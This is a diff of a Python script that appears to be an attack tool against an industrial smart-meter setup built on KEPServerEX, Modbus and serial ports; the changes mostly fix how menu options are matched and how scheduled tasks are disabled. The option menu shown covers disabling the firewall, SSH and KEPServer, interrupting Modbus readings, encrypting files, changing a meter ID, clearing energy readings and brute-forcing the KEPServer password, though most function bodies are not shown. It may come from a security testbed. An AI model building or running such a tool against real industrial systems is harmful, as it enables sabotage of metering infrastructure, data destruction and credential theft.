@@ -1112,16 +1112,16 @@ def kep_get_single_user(user):
     print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
 
 def disable_running_schedules() -> None:
-    # NOTE: UNTESTED
-    cp = run(["schtasks", "/change", "/TN", "'\MoveFiles'", "/disable"], stdout=PIPE, check=False)
+    cp = run(["schtasks", "/change", "/TN", "\MoveFiles", "/disable"], stdout=PIPE, check=False)
     output = cp.stdout.decode('utf-8').strip().split()
     if "SUCCESS:" in output:
-        print("Successfully disabled \MoveFiles Tasks Scheduler")
+        print("Successfully disabled \MoveFiles Tasks Scheduler", file=sys.stdout)
         print("Ok.")
 
-    cp = run(["schtasks", "/change", "/TN", "'\KEPServerEX 6.12'", "/disable"], stdout=PIPE, check=False)
+    cp = run(["schtasks", "/change", "/TN", "\KEPServerEX 6.12", "/disable"], stdout=PIPE, check=False)
+    output = cp.stdout.decode('utf-8').strip().split()
     if "SUCCESS:" in output:
-        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler")
+        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler", file=sys.stdout)
         print("Ok.")
     
 
@@ -1137,7 +1137,7 @@ if __name__ == '__main__':
         check_admin()
 
     match attack_option:
-        case 1: # TODO: Push the exception to the function itself
+        case "1": # TODO: Push the exception to the function itself
             try:
                 create_scheduled_task()
                 print("\nOk.\n")
@@ -1145,7 +1145,7 @@ if __name__ == '__main__':
                 print(e)
                 print("\nFail.\n")
         
-        case 2: # TODO: Push the exception to the function itself
+        case "2": # TODO: Push the exception to the function itself
             try:
                 create_shared_folder()
                 copy_file(SMARTMETER_PATH)
@@ -1153,28 +1153,28 @@ if __name__ == '__main__':
             except Exception as e:
                 print("\nFail.\n")
         
-        case 3:  disable_firewall()
-        case 4:  disable_ssh()
-        case 5:  disable_kepserver()
-        case 6:  run_modinterrupt()
-        case 7:  disable_COMPort()
-        case 8:  encrypt_files()
-        case 9:  change_meterID()
-        case 10: clear_energy_reading()
+        case "3":  disable_firewall()
+        case "4":  disable_ssh()
+        case "5":  disable_kepserver()
+        case "6":  run_modinterrupt()
+        case "7":  disable_COMPort()
+        case "8":  encrypt_files()
+        case "9":  change_meterID()
+        case "10": clear_energy_reading()
         
-        case 11:
+        case "11":
             revert_option = str(argv[2])
             revert(revert_option)
         
-        case 12: kep_bruteforce()
-        case 13: change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
-        case 14: smartmeter_get_hardware_info()
-        case 15: kep_server_info()
-        case 16: kep_get_all_users()
-        case 17: kep_enable_user("User1")
-        case 18: kep_disable_user("User1")
-        case 19: kep_get_single_user("User1")
-        case 20: disable_running_schedules()
+        case "12": kep_bruteforce()
+        case "13": change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
+        case "14": smartmeter_get_hardware_info()
+        case "15": kep_server_info()
+        case "16": kep_get_all_users()
+        case "17": kep_enable_user("User1")
+        case "18": kep_disable_user("User1")
+        case "19": kep_get_single_user("User1")
+        case "20": disable_running_schedules()
         case "-h":
             print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
         case _: print("Invalid Option! Use option \"-h\" for help!")
